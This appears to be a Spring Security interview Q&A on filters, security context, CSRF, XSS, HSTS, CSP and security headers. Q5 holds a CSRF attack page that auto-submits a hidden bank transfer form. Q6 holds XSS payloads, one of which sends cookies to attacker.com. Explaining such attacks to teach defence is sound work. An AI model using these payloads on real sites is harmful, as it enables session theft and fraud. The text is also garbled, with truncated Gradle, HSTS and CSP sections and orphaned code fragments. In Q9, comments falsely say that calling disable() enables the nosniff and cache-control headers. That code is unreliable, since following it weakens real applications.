## Q1. What are spring filters?

**Answer:**  
Spring Filters are **Servlet API components** that intercept HTTP requests/responses **before they reach the controller** or **before they go to the client**. Spring Security uses a chain of filters to implement authentication and authorization.

**Filter Chain Concept:**
```
Client Request
    │
    ▼
┌─────────────────────────────────────────────────────────────┐
│                    Filter Chain                              │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐ ┌──────────┐       │
│  │Filter 1  │→│Filter 2  │→│Filter 3  │→│...       │       │
│  └──────────┘ └──────────┘ └──────────┘ └──────────┘       │
└─────────────────────────────────────────────────────────────┘
    │
    ▼
DispatcherServlet → Controller → Response
    │
    ▼ (Response goes back through filters in reverse order)
```

**Spring Security's Main Filters:**

```java
// Spring Security adds these filters automatically
// 1. UsernamePasswordAuthenticationFilter - Processes login form
// 2. BasicAuthenticationFilter - Processes HTTP Basic auth
// 3. JwtAuthenticationFilter - Custom JWT validation
// 4. ExceptionTranslationFilter - Handles security exceptions
// 5. FilterSecurityInterceptor - Authorizes requests
```

**Creating a Custom Filter:**

```java
// Method 1: Implement Filter interface
@Component
public class CustomFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                         FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        HttpServletResponse httpResponse = (HttpServletResponse) response;
        
        // Before controller - log request
        System.out.println("Request URL: " + httpRequest.getRequestURL());
        System.out.println("Request Method: " + httpRequest.getMethod());
        
        // Continue to next filter or controller
        chain.doFilter(request, response);
        
        // After controller - log response
        System.out.println("Response Status: " + httpResponse.getStatus());
    }
}

// Method 2: Extend OncePerRequestFilter (Recommended for Spring Security)
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        
        String authHeader = request.getHeader("Authorization");
        
        if (authHeader != null && authHeader.startsWith("Bearer ")) {
            String token = authHeader.substring(7);
            // Validate token
            if (isValidToken(token)) {
                // Set authentication in context
                UsernamePasswordAuthenticationToken auth = 
                    new UsernamePasswordAuthenticationToken(username, null, authorities);
                SecurityContextHolder.getContext().setAuthentication(auth);
            }
        }
        
        filterChain.doFilter(request, response);
    }
}
```

**Registering Filters in Spring Security:**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .addFilterBefore(new CustomFilter(), UsernamePasswordAuthenticationFilter.class)
            .addFilterAfter(new AnotherFilter(), BasicAuthenticationFilter.class)
            .addFilterAt(new PositionFilter(), UsernamePasswordAuthenticationFilter.class)
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/public/**").permitAll()
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
}
```

**Filter Order in Spring Security:**

```java
// Default order of Spring Security filters
// 1. WebAsyncManagerIntegrationFilter
// 2. SecurityContextPersistenceFilter
// 3. HeaderWriterFilter
// 4. CsrfFilter
// 5. LogoutFilter
// 6. UsernamePasswordAuthenticationFilter
// 7. DefaultLoginPageGeneratingFilter
// 8. DefaultLogoutPageGeneratingFilter
// 9. BasicAuthenticationFilter
// 10. RequestCacheAwareFilter
// 11. SecurityContextHolderAwareRequestFilter
// 12. AnonymousAuthenticationFilter
// 13. SessionManagementFilter
// 14. ExceptionTranslationFilter
// 15. FilterSecurityInterceptor
```

**Real-world Example - Request Logging Filter:**

```java
@Component
@Slf4j
public class RequestLoggingFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        
        long startTime = System.currentTimeMillis();
        
        // Log request
        log.info("Incoming Request: {} {} from {}",
            request.getMethod(),
            request.getRequestURI(),
            request.getRemoteAddr());
        
        // Wrap response to capture body
        ContentCachingResponseWrapper responseWrapper = 
            new ContentCachingResponseWrapper(response);
        
        filterChain.doFilter(request, responseWrapper);
        
        long duration = System.currentTimeMillis() - startTime;
        
        // Log response
        log.info("Response Status: {} - Duration: {}ms",
            response.getStatus(),
            duration);
        
        responseWrapper.copyBodyToResponse();
    }
}
```

**Interview Tip:** "Spring Filters intercept HTTP requests before reaching controllers. Spring Security uses a chain of ~15 filters. Custom filters can be added using `OncePerRequestFilter`. Order matters - use `@Order` or `addFilterBefore/After` to position correctly."

## Q2. What is Spring Security Context?

**Answer:**  
Spring Security Context holds **security information of currently authenticated user** (authentication object, authorities, details). It's stored in `SecurityContextHolder`.

**Security Context Structure:**

```java
SecurityContextHolder (holds SecurityContext)
    │
    └── SecurityContext (ThreadLocal storage)
            │
            └── Authentication (principal details)
                    ├── principal (User details)
                    ├── credentials (password/token - usually cleared)
                    ├── authorities (roles/permissions)
                    ├── details (IP, session, etc.)
                    └── authenticated (true/false)
```

**Basic Usage:**

```java
// Get current authentication
Authentication auth = SecurityContextHolder.getContext().getAuthentication();

// Get user details
String username = auth.getName();
Object principal = auth.getPrincipal();
Collection<? extends GrantedAuthority> roles = auth.getAuthorities();

// Check if authenticated
boolean isAuthenticated = auth.isAuthenticated();

// Custom user details
if (principal instanceof UserDetails) {
    UserDetails userDetails = (UserDetails) principal;
    System.out.println("Username: " + userDetails.getUsername());
    System.out.println("Enabled: " + userDetails.isEnabled());
}

// Set custom authentication (for testing or JWT)
UsernamePasswordAuthenticationToken authentication = 
    new UsernamePasswordAuthenticationToken(username, null, authorities);
SecurityContextHolder.getContext().setAuthentication(authentication);
```

**SecurityContextHolder Strategies:**

```java
// Strategy 1: MODE_THREADLOCAL (default) - Each thread has its own context
// Best for web applications where each request is processed by single thread

// Strategy 2: MODE_INHERITABLETHREADLOCAL - Child threads inherit context
// Use when spawning new threads that need security context

// Strategy 3: MODE_GLOBAL - Single context for all threads
// Rarely used - not recommended for web apps

// Configure strategy
@Bean
public InitializingBean securityConfig() {
    return () -> {
        SecurityContextHolder.setStrategyName(
            SecurityContextHolder.MODE_INHERITABLETHREADLOCAL
        );
    };
}
```

**Accessing Security Context in Different Layers:**

```java
// In Controller
@RestController
public class UserController {
    
    @GetMapping("/me")
    public UserDTO getCurrentUser() {
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        String username = auth.getName();
        return userService.findByUsername(username);
    }
    
    // Alternative: Use @AuthenticationPrincipal
    @GetMapping("/profile")
    public UserDTO getProfile(@AuthenticationPrincipal UserDetails user) {
        return userService.findByUsername(user.getUsername());
    }
}

// In Service
@Service
public class UserService {
    
    public UserDTO getCurrentUser() {
        // Security context accessible anywhere in the same thread
        Authentication auth = SecurityContextHolder.getContext().getAuthentication();
        return userRepository.findByUsername(auth.getName());
    }
}

// In Repository (not recommended - security logic in repository is bad practice)
@Repository
public class UserRepository {
    
    public User findCurrentUser() {
        String username = SecurityContextHolder.getContext().getAuthentication().getName();
        return findByName(username);
    }
}
```

**Custom Authentication Object:**

```java
// Custom user details
public class CustomUserDetails implements UserDetails {
    private Long id;
    private String username;
    private String email;
    private String department;
    private List<GrantedAuthority> authorities;
    
    // constructor, getters...
}

// Setting custom authentication
CustomUserDetails userDetails = customUserService.loadUserByUsername(username);
UsernamePasswordAuthenticationToken auth = 
    new UsernamePasswordAuthenticationToken(userDetails, null, userDetails.getAuthorities());
SecurityContextHolder.getContext().setAuthentication(auth);

// Later retrieve custom fields
Authentication auth = SecurityContextHolder.getContext().getAuthentication();
CustomUserDetails user = (CustomUserDetails) auth.getPrincipal();
String department = user.getDepartment();  // Custom field
```

**Security Context in Asynchronous Processing:**

```java
@Configuration
@EnableAsync
public class AsyncConfig {
    
    @Bean
    public TaskDecorator securityContextTaskDecorator() {
        return runnable -> {
            SecurityContext context = SecurityContextHolder.getContext();
            return () -> {
                SecurityContextHolder.setContext(context);
                try {
                    runnable.run();
                } finally {
                    SecurityContextHolder.clearContext();
                }
            };
        };
    }
    
    @Bean
    public Executor asyncExecutor() {
        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();
        executor.setTaskDecorator(securityContextTaskDecorator());
        return executor;
    }
}

// Now async methods have access to security context
@Service
public class NotificationService {
    
    @Async
    public void sendAsyncNotification() {
        // Security context is propagated to this async thread
        String username = SecurityContextHolder.getContext().getAuthentication().getName();
        // Send notification for current user
    }
}
```

**Clearing Security Context:**

```java
// On logout
@PostMapping("/logout")
public String logout() {
    SecurityContextHolder.clearContext();  // Clear for this thread
    return "Logged out";
}

// In filters after request processing
@Component
public class SecurityContextClearingFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request,
                                    HttpServletResponse response,
                                    FilterChain filterChain) throws ServletException, IOException {
        try {
            filterChain.doFilter(request, response);
        } finally {
            SecurityContextHolder.clearContext();  // Always clear to prevent memory leaks
        }
    }
}
```

**Interview Tip:** "SecurityContextHolder stores Authentication object for current thread. Default strategy = MODE_THREADLOCAL (each request thread). Access via `SecurityContextHolder.getContext().getAuthentication()`. Use `@AuthenticationPrincipal` in controllers for cleaner code. Clear context in finally blocks to prevent memory leaks."

## Q3. Difference between Filter vs Interceptor?

**Answer:**

| Feature | Filter | Interceptor |
|---------|--------|-------------|
| **Part of** | Servlet API (JEE standard) | Spring MVC (Spring specific) |
| **Entry point** | Before/after Servlet | Before/after Controller |
| **Access to** | ServletRequest/Response | HandlerMethod, ModelAndView |
| **Spring context** | No direct access (but can be Spring bean) | Full Spring context access |
| **When to use** | Request/response manipulation, logging, authentication | Pre/post processing of controller, transaction management |
| **Order control** | Filter chain order | Interceptor order (addOrder) |
| **Access to controller** | No | Yes (can get handler method) |

**Visual Flow:**
```
Request → Filter1 → Filter2 → Interceptor1(preHandle) → Controller 
                                                          │
Response ← Filter1 ← Filter2 ← Interceptor1(postHandle) ← 
                                                          │
                           Interceptor1(afterCompletion) ← (after response)
```

**Filter Example:**

```java
@Component
public class RequestLoggingFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, 
                         FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest req = (HttpServletRequest) request;
        long startTime = System.currentTimeMillis();
        
        // Before controller
        System.out.println("[FILTER] Request: " + req.getMethod() + " " + req.getRequestURI());
        
        chain.doFilter(request, response);  // Continue to next filter/interceptor/controller
        
        // After controller
        long duration = System.currentTimeMillis() - startTime;
        System.out.println("[FILTER] Response time: " + duration + "ms");
    }
}
```

**Interceptor Example:**

```java
@Component
public class PerformanceInterceptor implements HandlerInterceptor {
    
    private static final String START_TIME = "startTime";
    
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, 
                             Object handler) throws Exception {
        
        long startTime = System.currentTimeMillis();
        request.setAttribute(START_TIME, startTime);
        
        // Can inspect handler (controller method)
        if (handler instanceof HandlerMethod) {
            HandlerMethod method = (HandlerMethod) handler;
            String controller = method.getBeanType().getSimpleName();
            String action = method.getMethod().getName();
            System.out.println("[INTERCEPTOR] Calling: " + controller + "." + action);
        }
        
        return true;  // Continue to controller
    }
    
    @Override
    public void postHandle(HttpServletRequest request, HttpServletResponse response,
                           Object handler, ModelAndView modelAndView) throws Exception {
        
        long startTime = (Long) request.getAttribute(START_TIME);
        long duration = System.currentTimeMillis() - startTime;
        
        System.out.println("[INTERCEPTOR] Execution time: " + duration + "ms");
        
        // Can modify ModelAndView
        if (modelAndView != null) {
            modelAndView.addObject("executionTime", duration);
        }
    }
    
    @Override
    public void afterCompletion(HttpServletRequest request, HttpServletResponse response,
                                Object handler, Exception ex) throws Exception {
        
        System.out.println("[INTERCEPTOR] Request completed");
        // Always called, even if exception occurred
    }
}
```

**Registering Interceptor:**

```java
@Configuration
public class WebConfig implements WebMvcConfigurer {
    
    @Autowired
    private PerformanceInterceptor performanceInterceptor;
    
    @Autowired
    private AuthenticationInterceptor authInterceptor;
    
    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(performanceInterceptor)
            .addPathPatterns("/api/**")
            .excludePathPatterns("/public/**")
            .order(1);
        
        registry.addInterceptor(authInterceptor)
            .addPathPatterns("/admin/**")
            .order(0);  // Lower order = executes first
    }
}
```

**Real-world Use Cases:**

```java
// Filter: JWT Authentication (works at request level)
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    // Good for: Authentication, request wrapping, CORS
}

// Interceptor: Audit Logging (has access to controller info)
@Component
public class AuditInterceptor implements HandlerInterceptor {
    // Good for: Logging which method was called, with what parameters
}

// Filter vs Interceptor Decision:
// - Use Filter for: Request/response modification, encoding, compression
// - Use Interceptor for: Business logic before/after controller, transaction mgmt
```

**Combined Example - API Key Validation:**

```java
// Filter - Quick rejection of requests without API key
@Component
public class ApiKeyFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                         FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest req = (HttpServletRequest) request;
        String apiKey = req.getHeader("X-API-Key");
        
        if (apiKey == null) {
            ((HttpServletResponse) response).sendError(401, "API Key required");
            return;  // Stop processing
        }
        
        chain.doFilter(request, response);  // Continue
    }
}

// Interceptor - Validate specific method permissions
@Component
public class PermissionInterceptor implements HandlerInterceptor {
    
    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response,
                             Object handler) throws Exception {
        
        if (handler instanceof HandlerMethod) {
            HandlerMethod method = (HandlerMethod) handler;
            
            // Check if method requires specific permission
            RequiresPermission annotation = method.getMethodAnnotation(RequiresPermission.class);
            if (annotation != null) {
                String permission = annotation.value();
                if (!hasPermission(permission)) {
                    response.sendError(403, "Insufficient permissions");
                    return false;
                }
            }
        }
        return true;
    }
}
```

**Interview Tip:** "Filters (Servlet level) vs Interceptors (Spring MVC level). Filters execute before Interceptors. Filters can't access controller information, Interceptors can. Use filters for low-level request handling, interceptors for business logic around controller execution."

## Q4. How can we upgrade spring security version in spring boot?

**Answer:**  
Spring Boot manages Spring Security version automatically. Upgrade by changing Spring Boot version or explicitly overriding.

**Method 1: Upgrade Spring Boot Version (Recommended)**

```xml
<!-- pom.xml -->
<parent>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-parent</artifactId>
    <version>3.2.0</version>  <!-- Upgrade here -->
    <relativePath/>
</parent>

<!-- Spring Security version is managed by Spring Boot -->
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-security</artifactId>
    <!-- No version needed - inherits from parent -->
</dependency>
```

**Method 2: Explicitly Override Version**

```xml
<properties>
    <!-- Override Spring Security version -->
    <spring-security.version>6.2.0</spring-security.version>
</properties>

<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-core</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-web</artifactId>
</dependency>
<dependency>
    <groupId>org.springframework.security</groupId>
    <artifactId>spring-security-config</artifactId>
</dependency>
```

**Method 3: Using Spring Boot Dependency Management**

```xml
<dependencyManagement>
    <dependencies>
        <dependency>
            <groupId>org.springframework.security</groupId>
            <artifactId>spring-security-bom</artifactId>
            <version>6.2.0</version>
            <type>pom</type>
            <scope>import</scope>
        </dependency>
    </dependencies>
</dependencyManagement>
```

**Gradle Configuration:**

```gradle

## Q5. What is Cross-Site Request Forgery (CSRF)?

**Answer:**  
CSRF is an attack where **malicious website tricks a user's browser** into making unauthorized requests to a trusted site where the user is authenticated.

**How CSRF Works:**

```
1. User logs into bank.com (gets session cookie)
2. User visits malicious site (attacker.com) without logging out
3. Malicious site sends hidden request to bank.com/transfer?amount=1000&to=attacker
4. Browser automatically includes session cookie
5. Bank.com sees valid session and executes transfer
```

**CSRF Attack Example:**

```html
<!-- Malicious website (attacker.com) -->
<img src="https://bank.com/transfer?amount=1000&to=attacker123" 
     style="display:none" />

<!-- Or via form auto-submit -->
<form action="https://bank.com/transfer" method="POST" id="csrfForm">
    <input type="hidden" name="amount" value="1000" />
    <input type="hidden" name="to" value="attacker123" />
</form>
<script>document.getElementById('csrfForm').submit();</script>
```

**CSRF Protection in Spring Security:**

```java
// Spring Security enables CSRF protection by default (for non-GET requests)
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                // or .csrfTokenRepository(new HttpSessionCsrfTokenRepository())
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/**").authenticated()
                .anyRequest().permitAll()
            );
        
        return http.build();
    }
}
```

**Getting CSRF Token in Frontend:**

```javascript
// When using CookieCsrfTokenRepository
// CSRF token is stored in cookie named "XSRF-TOKEN"

// Read cookie
const csrfToken = getCookie('XSRF-TOKEN');

// Send with requests
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'X-XSRF-TOKEN': csrfToken,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ amount: 1000, to: 'recipient' })
});

// Helper to read cookie
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}
```

**Disabling CSRF (When NOT needed):**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .csrf(csrf -> csrf.disable())  // Only for stateless APIs
            .authorizeHttpRequests(auth -> auth
                .anyRequest().authenticated()
            );
        
        return http.build();
    }
}
```

**When to Disable CSRF:**

```java
// ✅ DISABLE CSRF for:
// - Stateless REST APIs (JWT, OAuth2)
// - Mobile apps (no cookies/ sessions)
// - Machine-to-machine communication

// ❌ KEEP CSRF for:
// - Traditional web apps with sessions
// - Browser-based forms
// - Any app using cookie-based authentication
```

**Custom CSRF Protection:**

```java
// Custom CSRF token repository
@Component
public class CustomCsrfTokenRepository implements CsrfTokenRepository {
    
    @Override
    public CsrfToken generateToken(HttpServletRequest request) {
        String token = UUID.randomUUID().toString();
        return new DefaultCsrfToken("X-CSRF-TOKEN", "_csrf", token);
    }
    
    @Override
    public void saveToken(CsrfToken token, HttpServletRequest request,
                          HttpServletResponse response) {
        // Store in HTTP-only cookie
        Cookie cookie = new Cookie("XSRF-TOKEN", token.getToken());
        cookie.setHttpOnly(true);
        cookie.setSecure(true);
        cookie.setPath("/");
        response.addCookie(cookie);
    }
    
    @Override
    public CsrfToken loadToken(HttpServletRequest request) {
        // Load from cookie
        Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
                if ("XSRF-TOKEN".equals(cookie.getName())) {
                    return new DefaultCsrfToken("X-CSRF-TOKEN", "_csrf", cookie.getValue());
                }
            }
        }
        return null;
    }
}
```

## Q6. What is Cross-Site Scripting (XSS)?

**Answer:**  
XSS is an attack where **malicious scripts are injected** into trusted websites, executing in users' browsers and stealing data.

**Types of XSS Attacks:**

**1. Reflected XSS (Non-persistent):**
```javascript
// Attack: User clicks malicious link
// https://bank.com/search?q=<script>stealCookies()</script>

// Vulnerable code
@GetMapping("/search")
public String search(@RequestParam String q, Model model) {
    model.addAttribute("query", q);  // Directly rendering user input
    return "searchResults";
}

// HTML template (vulnerable)
<div>Search results for: ${query}</div>  // Script executes!

// Attacker steals cookies
<script>
    fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

**2. Stored XSS (Persistent):**
```javascript
// Attack: Store malicious script in database
// Comment posted on blog: 
// <script>alert('XSS')</script>

// Vulnerable code
@PostMapping("/comment")
public String addComment(Comment comment) {
    commentRepository.save(comment);  // Stored in DB
    return "redirect:/blog";
}

// When any user views the blog, script executes
<div class="comment">${comment.text}</div>  // Script runs for everyone!
```

**3. DOM-based XSS:**
```javascript
// Attack via URL fragment
// https://bank.com/#<img src=x onerror=alert('XSS')>

// Vulnerable JavaScript
var hash = location.hash.substring(1);
document.getElementById("content").innerHTML = hash;
```

**Prevention in Spring Boot:**

```java
// 1. Enable Content Security Policy (CSP) headers

@EnableWebSecurity

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy("default-src 'self'; script-src 'self'")
            );
        return http.build();
    }
}

// 2. Use XSS filters
@Component
public class XssFilter implements Filter {
    
    @Override
    public void doFilter(ServletRequest request, ServletResponse response,
                         FilterChain chain) throws IOException, ServletException {
        
        HttpServletRequest httpRequest = (HttpServletRequest) request;
        chain.doFilter(new XssRequestWrapper(httpRequest), response);
    }
}

// Wrapper to escape input
public class XssRequestWrapper extends HttpServletRequestWrapper {
    
    public XssRequestWrapper(HttpServletRequest request) {
        super(request);
    }
    
    @Override
    public String[] getParameterValues(String parameter) {
        String[] values = super.getParameterValues(parameter);
        if (values == null) return null;
        
        String[] encodedValues = new String[values.length];
        for (int i = 0; i < values.length; i++) {
            encodedValues[i] = HtmlUtils.htmlEscape(values[i]);
        }
        return encodedValues;
    }
    
    @Override
    public String getParameter(String parameter) {
        String value = super.getParameter(parameter);
        return HtmlUtils.htmlEscape(value);
    }
}
```

## Q7. What is HSTS (HTTP Strict Transport Security)?

**Answer:**  
HSTS forces browsers to **always use HTTPS** instead of HTTP, preventing SSL stripping attacks and man-in-the-middle (MITM) attacks.

**How HSTS Works:**
```
1. User types http://bank.com (or just bank.com)
2. Browser sees HSTS header from previous visit
3. Browser automatically converts to https://bank.com
4. Prevents any HTTP request to the domain
```

**HSTS Header:**
```
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```

**Enable HSTS in Spring Boot:**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .hsts(hsts -> hsts
                    .maxAge(Duration.ofDays(365))  // 1 year
                    .includeSubDomains(true)       // Apply to all subdomains
                    .preload(true)                 // Allow preload list submission
                )
            )
            // Also redirect HTTP to HTTPS
            .requiresChannel(channel -> channel
                .anyRequest().requiresSecure()
            );
        
        return http.build();
    }
}
```

**Configure HTTPS in Spring Boot:**

```properties
# application.properties
server.port=8443
server.ssl.enabled=true
server.ssl.key-store=classpath:keystore.p12
server.ssl.key-store-password=secret
server.ssl.key-store-type=PKCS12
server.ssl.key-alias=tomcat

# Redirect HTTP to HTTPS
server.http.port=8080
```

**HTTP to HTTPS Redirect:**

```java
@Configuration
public class HttpsConfig {
    
    @Bean
    public TomcatServletWebServerFactory servletContainer() {
        TomcatServletWebServerFactory tomcat = new TomcatServletWebServerFactory() {
            @Override
            protected void postProcessContext(Context context) {
                SecurityConstraint securityConstraint = new SecurityConstraint();
                securityConstraint.setUserConstraint("CONFIDENTIAL");
                SecurityCollection collection = new SecurityCollection();
                collection.addPattern("/*");
                securityConstraint.addCollection(collection);
                context.addConstraint(securityConstraint);
            }
        };
        tomcat.addAdditionalTomcatConnectors(createHttpConnector());
        return tomcat;
    }
    
    private Connector createHttpConnector() {
        Connector connector = new Connector(TomcatServletWebServerFactory.DEFAULT_PROTOCOL);
        connector.setScheme("http");
        connector.setPort(8080);
        connector.setSecure(false);
        connector.setRedirectPort(8443);
        return connector;
    }
}
```

**HSTS Preload List:**

```java

**HSTS Header Options:**

| Directive | Description | Example |
|-----------|-------------|---------|
| `max-age` | Duration in seconds to remember HSTS | `max-age=31536000` (1 year) |
| `includeSubDomains` | Apply to all subdomains | `includeSubDomains` |

## Q8. What is CSP header in rest apis?

**Answer:**  
Content Security Policy (CSP) is a **security header** that tells the browser which sources of content (scripts, styles, images) are trusted, preventing XSS and data injection attacks.

**CSP Header Example:**
```
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; style-src 'self' 'unsafe-inline'
```

**Configure CSP in Spring Boot:**

```java
@Configuration
@EnableWebSecurity
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(policy -> policy
                    .policyDirectives("default-src 'self'; " +
                                      "script-src 'self' https://trusted-cdn.com; " +
                                      "style-src 'self' 'unsafe-inline'; " +
                                      "img-src 'self' data: https:; " +
                                      "font-src 'self'; " +
                                      "connect-src 'self' https://api.example.com; " +
                                      "frame-ancestors 'none'; " +
                                      "form-action 'self'; " +
                                      "base-uri 'self'; " +
                                      "object-src 'none'")
                )
            );
        return http.build();
    }
}
```

**CSP Directives Explained:**

| Directive | Controls | Example |
|-----------|----------|---------|
| `default-src` | Fallback for all types | `default-src 'self'` |
| `script-src` | JavaScript sources | `script-src 'self' 'unsafe-inline'` |
| `style-src` | CSS sources | `style-src 'self' https://fonts.googleapis.com` |
| `img-src` | Image sources | `img-src 'self' data: https:` |
| `connect-src` | AJAX/WebSocket targets | `connect-src 'self' https://api.example.com` |
| `font-src` | Font sources | `font-src 'self' https://fonts.gstatic.com` |
| `frame-ancestors` | Who can embed in iframe | `frame-ancestors 'none'` |
| `form-action` | Where forms can submit | `form-action 'self'` |
| `object-src` | Flash, Java applets | `object-src 'none'` |

**Common Source Values:**

```java
// Source values
'self'           // Same origin
'unsafe-inline'  // Inline scripts/styles (avoid if possible)
'unsafe-eval'    // eval() function (avoid)
https://cdn.com  // Specific domain
https:           // Any HTTPS domain
data:            // data: URIs (images)
'none'           // Block everything
*.example.com    // Any subdomain
```

**Reporting Only Mode:**

```java

    http
        .headers(headers -> headers
            .contentSecurityPolicy(policy -> policy
                .policyDirectives("default-src 'self'; report-uri /csp-report-endpoint")
                .reportOnly(true)  // Report only, don't block
            )
        );
    return http.build();
}

@RestController

    @PostMapping("/csp-report-endpoint")
    public void handleCspReport(@RequestBody Map<String, Object> report) {
        System.out.println("CSP Violation: " + report);
        // Log violation, send alert, etc.
    }
}
```

**Dynamic CSP with Nonce:**

```java

        http
            .headers(headers -> headers

                        request.setAttribute("cspNonce", nonce);
                        return "script-src 'self' 'nonce-" + nonce + "'";

**CSP for REST APIs (No HTML):**

        .headers(headers -> headers

For REST APIs, strict policy: `default-src 'none'`. CSP is defense-in-depth, not replacement for output encoding."

## Q9. Name and describe key security headers used to enhance web application security?

**Answer:**  

**1. HSTS (HTTP Strict Transport Security)**
```http
Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
```
- Forces HTTPS connections
- Prevents SSL stripping

**2. CSP (Content Security Policy)**
```http
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
```
- Prevents XSS by whitelisting content sources
- Controls scripts, styles, images, fonts

**3. X-Frame-Options**
```http
X-Frame-Options: DENY
```
- Prevents clickjacking
- DENY (no framing) or SAMEORIGIN (same domain only)

**4. X-Content-Type-Options**
```http
X-Content-Type-Options: nosniff
```
- Prevents MIME type sniffing
- Forces browser to respect declared Content-Type

**5. X-XSS-Protection**
```http
X-XSS-Protection: 1; mode=block
```
- Enables browser's built-in XSS filter
- Legacy header (modern browsers prefer CSP)

**6. Referrer-Policy**
```http
Referrer-Policy: strict-origin-when-cross-origin
```
- Controls how much referrer info is sent
- Options: no-referrer, same-origin, strict-origin

**7. Permissions-Policy (formerly Feature-Policy)**
```http
Permissions-Policy: geolocation=(), microphone=(), camera=()
```
- Controls browser features (geolocation, camera, etc.)

**8. Cache-Control**
```http
Cache-Control: no-cache, no-store, must-revalidate
```
- Prevents sensitive data caching
- Important for authenticated resources

**9. Clear-Site-Data**
```http
Clear-Site-Data: "cache", "cookies", "storage"
```
- Clears browsing data on logout

**Complete Spring Security Configuration:**

```java
@Configuration
@EnableWebSecurity
public class SecurityHeadersConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                // 1. HSTS
                .hsts(hsts -> hsts
                    .maxAge(Duration.ofDays(365))
                    .includeSubDomains(true)
                    .preload(true)
                )
                
                // 2. CSP
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; " +
                                      "script-src 'self' 'unsafe-inline'; " +
                                      "style-src 'self' 'unsafe-inline'; " +
                                      "img-src 'self' data:; " +
                                      "font-src 'self'; " +
                                      "connect-src 'self'; " +
                                      "frame-ancestors 'none'; " +
                                      "form-action 'self'; " +
                                      "base-uri 'self'; " +
                                      "object-src 'none'")
                )
                
                // 3. X-Frame-Options
                .frameOptions(frame -> frame
                    .deny()  // or .sameOrigin()
                )
                
                // 4. X-Content-Type-Options
                .contentTypeOptions(contentType -> contentType
                    .disable()  // Actually enables it - Spring Security default
                )
                
                // 5. X-XSS-Protection
                .xssProtection(xss -> xss
                    .block(true)
                    .xssProtectionEnabled(true)
                )
                
                // 6. Referrer-Policy
                .referrerPolicy(referrer -> referrer
                    .policy(ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN)
                )
                
                // 7. Permissions-Policy
                .permissionsPolicy(permissions -> permissions
                    .policy("geolocation=(), microphone=(), camera=(), usb=()")
                )
                
                // 8. Cache-Control (for authenticated endpoints)
                .cacheControl(cache -> cache
                    .disable()  // Enable cache control
                )
            )
            // Custom header for Clear-Site-Data on logout
            .logout(logout -> logout
                .logoutSuccessHandler((request, response, authentication) -> {
                    response.setHeader("Clear-Site-Data", "\"cache\", \"cookies\", \"storage\"");
                    response.setStatus(200);
                })
            );
        
        return http.build();
    }
}
```

**Testing Security Headers:**

```bash

# X-Frame-Options: DENY
# X-Content-Type-Options: nosniff
# X-XSS-Protection: 1; mode=block
# Referrer-Policy: strict-origin-when-cross-origin
# Permissions-Policy: geolocation=(), microphone=()...
# Cache-Control: no-cache, no-store, must-revalidate
```

**Security Headers Comparison:**

| Header | Purpose | Recommended Value |
|--------|---------|-------------------|
| HSTS | Force HTTPS | `max-age=31536000; includeSubDomains` |
| CSP | Prevent XSS | `default-src 'self'` (adjust as needed) |
| X-Frame-Options | Prevent clickjacking | `DENY` or `SAMEORIGIN` |
